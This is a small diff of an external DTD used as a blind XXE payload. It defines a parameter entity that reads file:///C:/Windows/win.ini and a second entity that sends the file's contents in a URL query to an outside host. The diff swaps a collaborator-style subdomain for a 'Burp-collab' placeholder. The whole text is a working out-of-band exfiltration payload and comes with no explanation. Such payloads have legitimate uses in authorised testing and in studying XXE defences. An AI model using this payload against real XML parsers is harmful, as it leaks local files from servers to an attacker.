@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://b8kezpmkwokq6vxpurio5mkex53wrpodd.x9.to/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://Burp-collab/?x=%file;'>">
 %eval;
 %exfil;
